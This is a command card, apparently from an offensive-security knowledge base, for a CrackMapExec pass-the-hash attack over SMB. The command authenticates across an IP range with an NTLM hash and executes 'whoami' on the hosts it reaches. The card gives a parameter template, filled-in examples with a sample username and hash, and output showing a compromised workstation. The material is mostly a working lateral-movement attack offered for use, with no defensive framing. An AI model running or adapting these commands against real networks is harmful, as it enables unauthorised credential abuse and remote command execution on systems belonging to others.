---
type: command
executor: bash
data: 'cme smb $_TARGET_RANGE -u $_USERNAME -H ''$_LM_HASH:$_NTLM_HASH'' -x "whoami"'
output: null
created_at: '2023-04-06T03:56:05Z'
updated_at: '2023-04-10T20:25:57Z'
platforms:
  - Linux
tags:
  - lateral-movement
  - pass-the-hash
verified: true
validated: true
---

# crackmapexec-smb-execute-whoami

## Command

```bash
cme smb $_TARGET_RANGE -u $_USERNAME -H '$_LM_HASH:$_NTLM_HASH' -x "whoami"
```

## Description

This command uses CrackMapExec to authenticate via SMB to a range of targets using Pass-the-Hash and execute the 'whoami' command to identify the current user context on successful authentications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_RANGE | IP range or CIDR (e.g., 10.2.0.2/24) | Yes |
| $_USERNAME | Username for authentication | Yes |
| $_LM_HASH | LM hash (often blank: aad3b435b51404eeaad3b435b51404ee) | Yes |
| $_NTLM_HASH | NTLM hash of the user | Yes |
| -x "whoami" | Command to execute on target | Yes |

## Examples

### Basic Usage

```bash
cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
```

### Advanced Usage

```bash
cme smb 10.2.0.0/24 --no-bruteforce -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami /all"
```

## Expected Output

SMB         10.2.0.2 445    DOMAIN\jarrieta       [*] Windows 10.0 Build 19041 (name:WORKSTATION1)
SMB         10.2.0.2 445    DOMAIN\jarrieta       [+] jarrieta\WORKSTATION1 (Pwn3d!)
whoami      10.2.0.2 445    DOMAIN\jarrieta       [*] Command execution successful
whoami      10.2.0.2 445    DOMAIN\jarrieta       DOMAIN\jarrieta

## Related

- [[procedures/Pass-the-Hash-Active-Directory-Attack]]
- [[commands/impacket-psexec-pass-the-hash]]
